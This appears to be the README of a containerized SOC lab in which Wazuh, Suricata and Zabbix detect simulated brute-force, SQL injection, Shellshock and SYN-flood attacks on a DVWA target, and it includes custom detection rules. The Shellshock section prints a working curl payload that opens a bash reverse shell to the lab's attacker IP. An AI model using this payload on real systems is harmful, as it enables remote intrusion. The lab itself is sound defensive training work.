# Enterprise SOC Detection Lab

A containerized Security Operations Center (SOC) lab built on Fedora Linux, integrating Wazuh SIEM, Suricata IDS, and Zabbix infrastructure monitoring to simulate, detect, and document real-world attack scenarios against a vulnerable web application target.

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                     Docker Network (172.19.0.0/16)              │
│                                                                  │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────────┐  │
│  │   DVWA       │    │   MySQL DB   │    │  Wazuh Manager   │  │
│  │  (Debian 13) │    │ (Oracle L. 9)│    │   172.19.0.10    │  │
│  │ Wazuh Agent  │    │ Wazuh Agent  │    │  + Indexer       │  │
│  │ Zabbix Agent │    │              │    │  + Dashboard     │  │
│  └──────┬───────┘    └──────────────┘    └──────────────────┘  │
│         │                                                        │
│  ┌──────┴───────┐    ┌──────────────┐    ┌──────────────────┐  │
│  │   Suricata   │    │   Attacker   │    │     Zabbix       │  │
│  │  (IDS/NTA)   │    │ (Kali Linux) │    │  Server + Web    │  │
│  │  eve.json →  │    │ hping3/hydra │    │  172.20.0.0/16   │  │
│  │  Wazuh ingest│    │ sqlmap/curl  │    │                  │  │
│  └──────────────┘    └──────────────┘    └──────────────────┘  │
└─────────────────────────────────────────────────────────────────┘
```

**Total containers: 12**
**Monitored Linux hosts: 2** (Debian 13 + Oracle Linux 9)

---

## Stack

| Component | Role | Version |
|---|---|---|
| Wazuh Manager | SIEM / HIDS correlation | 4.10.0 |
| Wazuh Indexer | OpenSearch data store | 4.10.0 |
| Wazuh Dashboard | Alert visualization | 4.10.0 |
| Suricata | Network IDS / packet analysis | 8.0.4 |
| Zabbix Server | Infrastructure monitoring | 7.0 |
| DVWA | Vulnerable web target | Latest |
| MySQL 8.0 | Database backend | 8.0.46 |
| Kali Linux | Attacker container | Rolling |

---

## Attack Scenarios & Detection Results

### 1. HTTP Brute Force — Hydra

**MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing

**Attack:** Hydra v9.7 fired 19 password attempts against DVWA's `/login.php` endpoint using HTTP POST form authentication.

**Detection:**
- Custom Wazuh rule `100001` (level 6) fired on each POST to `/login.php`
- Custom Wazuh rule `100002` (level 10) fired on frequency threshold — 5 attempts within 30 seconds
- Source IP `172.18.0.2` correctly attributed in all alerts
- Full Hydra user agent (`Mozilla/5.0 (Hydra)`) preserved in alert data

**Evidence:**
```json
{
  "rule": {
    "id": "100002",
    "level": 10,
    "description": "DVWA: Possible brute force - multiple login attempts detected",
    "groups": ["web", "authentication_failures", "brute_force"]
  },
  "agent": {"name": "dvwa-web"},
  "data": {"srcip": "172.18.0.2", "url": "/login.php"}
}
```

---

### 2. SQL Injection — sqlmap

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application

**Attack:** sqlmap v1.10.6 ran automated SQL injection tests against DVWA's `/vulnerabilities/sqli/` endpoint at level 3, risk 2, generating 65+ injection payloads.

**Detection (no custom rules needed — Wazuh built-in):**
- Rule `31103` (level 7): "SQL injection attempt" — fired 22+ times
- Rule `31152` (level 10): "Multiple SQL injection attempts from same source ip" — fired 3 times
- Rule `31171` (level 6): RLIKE/CASE-based injection pattern — fired 65+ times
- Full URL-encoded SQL payloads preserved in alert data
- PCI-DSS 6.5, GDPR IV_35.7.d, NIST SA.11/SI.4 compliance tags auto-populated

---

### 3. Shellshock (CVE-2014-6271)

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application

**Attack:** Shellshock payload injected via HTTP User-Agent header targeting the Apache/CGI environment on DVWA.

```bash
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/172.18.0.2/4444 0>&1" \
  http://dvwa/
```

**Detection:**
- Wazuh rule `31168` (level **15** — critical): "Shellshock attack detected"
- Highest possible severity in Wazuh
- Triggered on first request — zero false negatives
- Compliance: PCI-DSS, GDPR, NIST, MITRE mapped automatically

---

### 4. DDoS / SYN Flood — hping3 (via Suricata)

**MITRE ATT&CK:** T1498 — Network Denial of Service

**Attack:** hping3 SYN flood and UDP flood fired from dedicated attacker containers at `enterprise-webserver:80` and `:53`.

**Detection pipeline:**
```
hping3 (attacker) → Suricata custom rule fires → eve.json →
Wazuh localfile ingest → Wazuh rule 86601 alert → Dashboard
```

**Custom Suricata rules written:**
```
alert tcp any any -> any 80 (msg:"Possible SYN Flood Detected";
  flags:S; threshold:type both, track by_dst, count 50, seconds 5;
  sid:1000001; rev:1;)
```

**Wazuh alert:** rule `86601`, description `"Suricata: Alert - Possible SYN Flood Detected"`

---

### 5. Autonomous Rootcheck Findings

Without any attack being launched, Wazuh's built-in rootcheck module autonomously detected suspicious binaries on `dvwa-web`:

- `/bin/passwd`, `/bin/chsh`, `/bin/chfn` flagged as potentially trojaned
- Rule `510` (level 7): "Host-based anomaly detection event (rootcheck)"
- Demonstrates HIDS capability independent of active attack simulation

---

## Infrastructure Monitoring — Zabbix

Zabbix 7.0 deployed alongside the security stack to provide operational visibility:

- **dvwa-web** monitored via Zabbix Agent 2
- Metrics collected: CPU utilization, memory usage, network I/O, process count
- CPU spike visible in Zabbix graphs during attack simulation
- Demonstrates the distinction between *security detection* (Wazuh) and *operational impact* (Zabbix)

---

## Custom Detection Engineering

Two custom Wazuh rules written from scratch to detect DVWA-specific brute force:

```xml
<group name="web,authentication_failed,dvwa,">
  <rule id="100001" level="6" overwrite="yes">
    <if_sid>31108</if_sid>
    <url>/login.php</url>
    <match>POST</match>
    <description>DVWA: Login attempt via POST</description>
  </rule>

  <rule id="100002" level="10" frequency="5" timeframe="30">
    <if_matched_sid>100001</if_matched_sid>
    <description>DVWA: Possible brute force - multiple login attempts detected</description>
    <group>authentication_failures,brute_force,</group>
  </rule>
</group>
```

Debugging process used `wazuh-logtest` to trace decoder → rule chain and identify that rule `31108` ("Ignored URLs") was suppressing alerts at level 0, requiring an `overwrite="yes"` override.

---

## Technical Challenges Solved

| Challenge | Solution |
|---|---|
| Alpine apk TLS/mirror failures | Switched to prebuilt Docker Hub images (`sflow/hping3`) |
| Wazuh cert generation `cp: cannot overwrite directory` | Identified stale placeholder directories blocking cert files; cleared and regenerated |
| SELinux blocking Wazuh volume mounts | Set `SELINUX=permissive` permanently via `/etc/selinux/config` |
| OpenSearch JVM consuming 1GB RAM | Capped heap with `OPENSEARCH_JAVA_OPTS=-Xms512m -Xmx512m` |
| Apache logs symlinked to `/dev/stdout` | Replaced symlinks with real files in Dockerfile; redirected via Apache config |
| Wazuh rule `31108` suppressing web alerts | Used `overwrite="yes"` with parent `if_sid` to override the ignore rule |
| Wazuh agent version mismatch (4.14 vs 4.10) | Pinned agent to `wazuh-agent=4.10.0-1` matching manager version |
| Container IPs changing on restart | Assigned static IPs via Docker network IPAM (`ipv4_address: 172.19.0.10`) |

---

## Repository Structure

```
enterprise-soc-lab/
├── wazuh-images/single-node/      # Wazuh stack (manager + indexer + dashboard)
│   ├── docker-compose.yml
│   └── config/
│       └── wazuh_cluster/
│           └── wazuh_manager.conf # ossec.conf with custom localfile blocks
├── ecommerce-lab/                 # Target + attacker containers
│   ├── docker-compose.yml
│   ├── dvwa-image/
│   │   ├── Dockerfile             # DVWA + Wazuh agent + Zabbix agent baked in
│   │   └── entrypoint-dvwa.sh     # Multi-service entrypoint
│   ├── dvwa-db-image/
│   │   ├── Dockerfile             # MySQL + Wazuh agent
│   │   └── entrypoint-db.sh
│   └── suricata/
│       └── rules/
│           └── custom.rules       # SYN flood + UDP flood detection rules
├── ddos-simulation-lab/           # DDoS attack containers
│   └── docker-compose.yml
├── zabbix-lab/                    # Infrastructure monitoring
│   └── docker-compose.yml
└── start-lab.sh                   # Full lab startup script
```

---
